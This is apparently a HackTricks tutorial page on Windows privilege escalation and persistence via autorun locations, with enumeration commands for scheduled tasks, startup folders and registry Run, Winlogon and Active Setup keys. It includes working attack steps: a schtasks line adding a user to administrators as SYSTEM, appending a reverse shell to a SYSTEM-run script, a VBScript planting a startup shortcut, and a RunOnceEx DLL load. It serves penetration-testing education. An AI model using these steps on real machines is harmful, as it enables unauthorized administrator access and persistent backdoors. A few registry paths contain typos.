# Privilege Escalation with Autoruns

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## WMIC

**Wmic** can be used to run programs on **startup**. See which binaries are programmed to run is startup with:

```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```

## Scheduled Tasks

^bf7821

Windows can be configured to run tasks at specific
times, periodically (e.g. every 5 mins) or when triggered
by some event (e.g. a user logon).
Tasks usually run with the privileges of the user who
created them, however administrators can configure
tasks to run as other users, including SYSTEM

**Tasks** can be schedules to run with **certain frequency**. See which binaries are scheduled to run with:

```bash
# List all scheduled tasks your user can see:
schtasks /query /fo LIST /v

#In PowerShell:
PS> Get-ScheduledTask | where {$_.TaskPath -notlike
"\Microsoft*"} | ft TaskName,TaskPath,State


schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```

Unfortunately, there is no easy method for enumerating custom tasks that belong to other users as a low privileged user account Often we have to rely on other clues, such as finding a script or log file that indicates a scheduled task is being run.

1. In the C:\DevTools directory, there is a PowerShell script called
“CleanUp.ps1”. View the script:
`type C:\DevTools\CleanUp.ps1`

2. This script seems like it is running every minute as the SYSTEM user. We can check our privileges on this script using accesschk.exe:
`C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
3. Backup the script:
`copy C:\DevTools\CleanUp.ps1 C:\Temp\`
4. Start a listener on Kali.
5. Use echo to append a call to our reverse shell executable to the end of the script:
`echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
6. Wait for the scheduled task to run (it should run every minute) to complete the exploit.

All the binaries located in the **Startup folders are going to be executed on startup**. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```


 script can filter files by whether they are writable, have denied remove permissions, or can be moved. It outputs the results into separate files for each category and may allows for easy identification of potential custom scheduled tasks
 
```powershell
param (
    [switch]$W,     # Writable files
    [switch]$R,     # Files with remove permissions denied
    [switch]$M      # Movable files
)

# Set the number of files you want to retrieve
$FileCount = 2000  # Change to 100 if you want only the last 100 files
$TempFolder = "C:\Temp\MoveTest"  # Temporary folder for testing if files can be moved

# Create the temporary folder if it doesn't exist
if (-not (Test-Path -Path $TempFolder)) {
    New-Item -Path $TempFolder -ItemType Directory
}

# Initialize arrays for results
$Results = @()
$writableFiles = @()
$removeDeniedFiles = @()
$movableFiles = @()

# Search and sort the files, suppressing permission errors
try {
    $Results = Get-ChildItem -Path "C:\" -Recurse -File -ErrorAction SilentlyContinue | 
    Sort-Object LastWriteTime -Descending | 
    Select-Object -First $FileCount
} catch {
    Write-Host "An error occurred: $_"
}

# Check if results were found
if ($Results) {
    $Results | Format-Table FullName, LastWriteTime -AutoSize |
    Out-File -FilePath "C:\Temp\LastModifiedFiles.txt"
    Write-Host "Results saved to C:\Temp\LastModifiedFiles.txt"

    # Read the saved file
    $fileList = Get-Content -Path "C:\Temp\LastModifiedFiles.txt"

    foreach ($line in $fileList) {
        # Extract file path from the line
        $filePath = ($line -split "\s+")[0] # Adjust if the format is different

        if ($filePath -match "\.bat$|\.ps1$|\.exe$") {
            if ($W) {
                # Check if the file is writable
                try {
                    $file = Get-Item -Path $filePath
                    if ($file.Attributes -notmatch "ReadOnly") {
                        $writableFiles += $filePath
                    }
                } catch {
                    Write-Host "Could not access file: $filePath"
                }
            }

            if ($R) {
                # Check if remove permission is denied
                try {
                    $acl = Get-Acl -Path $filePath
                    $accessRules = $acl.Access

                    foreach ($rule in $accessRules) {
                        if ($rule.FileSystemRights -match "Delete" -and $rule.AccessControlType -eq "Deny") {
                            $removeDeniedFiles += $filePath
                            break
                        }
                    }
                } catch {
                    Write-Host "Could not access ACL for file: $filePath"
                }
            }

            if ($M) {
                # Check if file can be moved
                try {
                    $tempPath = Join-Path -Path $TempFolder -ChildPath (Split-Path -Path $filePath -Leaf)
                    Move-Item -Path $filePath -Destination $tempPath -ErrorAction SilentlyContinue
                    if (Test-Path -Path $tempPath) {
                        Remove-Item -Path $tempPath  # Cleanup after test
                        $movableFiles += $filePath
                    }
                } catch {
                    Write-Host "Could not move file: $filePath"
                }
            }
        }
    }

    # Print writable files if requested
    if ($W -and $writableFiles.Count -gt 0) {
        Write-Host "Writable .bat, .ps1, and .exe files:"
        $writableFiles | ForEach-Object { Write-Host $_ }
        $writableFiles | Out-File -FilePath "C:\Temp\WritableFiles.txt"
        Write-Host "Writable .bat, .ps1, and .exe files saved to C:\Temp\WritableFiles.txt"
    }

    # Print files with remove permissions denied if requested
    if ($R -and $removeDeniedFiles.Count -gt 0) {
        Write-Host "Files with remove permissions denied:"
        $removeDeniedFiles | ForEach-Object { Write-Host $_ }
        $removeDeniedFiles | Out-File -FilePath "C:\Temp\RemoveDeniedFiles.txt"
        Write-Host "Files with remove permissions denied saved to C:\Temp\RemoveDeniedFiles.txt"
    }

    # Print movable files if requested
    if ($M -and $movableFiles.Count -gt 0) {
        Write-Host "Movable .bat, .ps1, and .exe files:"
        $movableFiles | ForEach-Object { Write-Host $_ }
        $movableFiles | Out-File -FilePath "C:\Temp\MovableFiles.txt"
        Write-Host "Movable .bat, .ps1, and .exe files saved to C:\Temp\MovableFiles.txt"
    }

    # Clean up the temporary folder
    Remove-Item -Path $TempFolder -Recurse -Force
} else {
    Write-Host "No results found or access was denied to all directories."
}

```

`powershell -File script.ps1 -ArgumentList "W", "R", "M"` 
 Parameters:
- `-W`  
    **Include writable files (not read-only).**
    
- `-R`  
    **Include files with denied remove permissions.**
    
- `-M`  
    **Include files that can be moved.**
    

## Folders

^c48dcd

Each user can define apps that start when they log in, by placing
shortcuts to them in a specific directory.
Windows also has a startup directory for apps that should start for all
users:
`C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
If we can create files in this directory, we can use our reverse shell
executable and escalate privileges when an admin logs in.

All the binaries located in the **Startup folders are going to be executed on startup**. The common startup folders are the ones listed a continuation, but the startup folder is indicated in the registry. [Read this to learn where.](app://obsidian.md/privilege-escalation-with-autorun-binaries.md#startup-path)

```bash
dir /b "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" 2>nul

dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```

>Note that shortcut files (.lnk) must be used. The following VBScript can be used
to create a shortcut file "CreateShortcut.vbs" : 

```CreateShortcut.vbs
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "C:\PrivEsc\reverse.exe"
oLink.Save
```

1. Use accesschk.exe to check permissions on the StartUp
directory:
`.\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
2. Note that the BUILTIN\Users group has write access to
this directory. `RW BUILTIN\Users`
3. Create a file CreateShortcut.vbs with the VBScript provided in a previous slide. Change file paths if necessary.
4. Run the script using cscript: `cscript CreateShortcut.vbs`
5.  Start a listener on Kali, then log in as the admin user to trigger the exploit.

## Registry

{% hint style="info" %}
[Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): The **Wow6432Node** registry entry indicates that you are running a 64-bit Windows version. The operating system uses this key to display a separate view of HKEY\_LOCAL\_MACHINE\SOFTWARE for 32-bit applications that run on 64-bit Windows versions.
{% endhint %}

### Runs

**Commonly known** AutoRun registry:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry keys known as **Run** and **RunOnce** are designed to automatically execute programs every time a user logs into the system. The command line assigned as a key's data value is limited to 260 characters or less.

**Service runs** (can control automatic startup of services during boot):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

On Windows Vista and later versions, the **Run** and **RunOnce** registry keys are not automatically generated. Entries in these keys can either directly start programs or specify them as dependencies. For instance, to load a DLL file at logon, one could use the **RunOnceEx** registry key along with a "Depend" key. This is demonstrated by adding a registry entry to execute "C:\temp\evil.dll" during the system start-up:

```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```

{% hint style="info" %}
**Exploit 1**: If you can write inside any of the mentioned registry inside **HKLM** you can escalate privileges when a different user logs in.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: If you can overwrite any of the binaries indicated on any of the registry inside **HKLM** you can modify that binary with a backdoor when a different user logs in and escalate privileges.
{% endhint %}

```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```

### Startup Path

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Shortcuts placed in the **Startup** folder will automatically trigger services or applications to launch during user logon or system reboot. The **Startup** folder's location is defined in the registry for both the **Local Machine** and **Current User** scopes. This means any shortcut added to these specified **Startup** locations will ensure the linked service or program starts up following the logon or reboot process, making it a straightforward method for scheduling programs to run automatically.

{% hint style="info" %}
If you can overwrite any \[User] Shell Folder under **HKLM**, you will e able to point it to a folder controlled by you and place a backdoor that will be executed anytime a user logs in the system escalating privileges.
{% endhint %}

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typically, the **Userinit** key is set to **userinit.exe**. However, if this key is modified, the specified executable will also be launched by **Winlogon** upon user logon. Similarly, the **Shell** key is intended to point to **explorer.exe**, which is the default shell for Windows.

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```

{% hint style="info" %}
If you can overwrite the registry value or the binary you will be able to escalate privileges.
{% endhint %}

### Policy Settings

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Check **Run** key.

```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```

### AlternateShell

### Changing the Safe Mode Command Prompt

In the Windows Registry under `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, there's a **`AlternateShell`** value set by default to `cmd.exe`. This means when you choose "Safe Mode with Command Prompt" during startup (by pressing F8), `cmd.exe` is used. But, it's possible to set up your computer to automatically start in this mode without needing to press F8 and manually select it.

Steps to create a boot option for automatically starting in "Safe Mode with Command Prompt":

1. Change attributes of the `boot.ini` file to remove read-only, system, and hidden flags: `attrib c:\boot.ini -r -s -h`
2. Open `boot.ini` for editing.
3. Insert a line like: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Save changes to `boot.ini`.
5. Reapply the original file attributes: `attrib c:\boot.ini +r +s +h`

* **Exploit 1:** Changing the **AlternateShell** registry key allows for custom command shell setup, potentially for unauthorized access.
* **Exploit 2 (PATH Write Permissions):** Having write permissions to any part of the system **PATH** variable, especially before `C:\Windows\system32`, lets you execute a custom `cmd.exe`, which could be a backdoor if the system is started in Safe Mode.
* **Exploit 3 (PATH and boot.ini Write Permissions):** Writing access to `boot.ini` enables automatic Safe Mode startup, facilitating unauthorized access on the next reboot.

To check the current **AlternateShell** setting, use these commands:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```

### Installed Component

Active Setup is a feature in Windows that **initiates before the desktop environment is fully loaded**. It prioritizes the execution of certain commands, which must complete before the user logon proceeds. This process occurs even before other startup entries, such as those in the Run or RunOnce registry sections, are triggered.

Active Setup is managed through the following registry keys:

* `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Within these keys, various subkeys exist, each corresponding to a specific component. Key values of particular interest include:

* **IsInstalled:**
  * `0` indicates the component's command will not execute.
  * `1` means the command will execute once for each user, which is the default behavior if the `IsInstalled` value is missing.
* **StubPath:** Defines the command to be executed by Active Setup. It can be any valid command line, such as launching `notepad`.

**Security Insights:**

* Modifying or writing to a key where **`IsInstalled`** is set to `"1"` with a specific **`StubPath`** can lead to unauthorized command execution, potentially for privilege escalation.
* Altering the binary file referenced in any **`StubPath`** value could also achieve privilege escalation, given sufficient permissions.

To inspect the **`StubPath`** configurations across Active Setup components, these commands can be used:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```

### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) are DLL modules that add extra features to Microsoft's Internet Explorer. They load into Internet Explorer and Windows Explorer on each start. Yet, their execution can be blocked by setting **NoExplorer** key to 1, preventing them from loading with Windows Explorer instances.

BHOs are compatible with Windows 10 via Internet Explorer 11 but are not supported in Microsoft Edge, the default browser in newer versions of Windows.

To explore BHOs registered on a system, you can inspect the following registry keys:

* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Each BHO is represented by its **CLSID** in the registry, serving as a unique identifier. Detailed information about each CLSID can be found under `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

For querying BHOs in the registry, these commands can be utilized:

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```

### Internet Explorer Extensions

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Note that the registry will contain 1 new registry per each dll and it will be represented by the **CLSID**. You can find the CLSID info in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```

### Open Command

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`

```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```

### Image File Execution Options

```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```

## SysInternals

Note that all the sites where you can find autoruns are **already searched by**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). However, for a **more comprehensive list of auto-executed** file you could use [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)from systinternals:

```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```

## More

**Find more Autoruns like registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)

## References

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
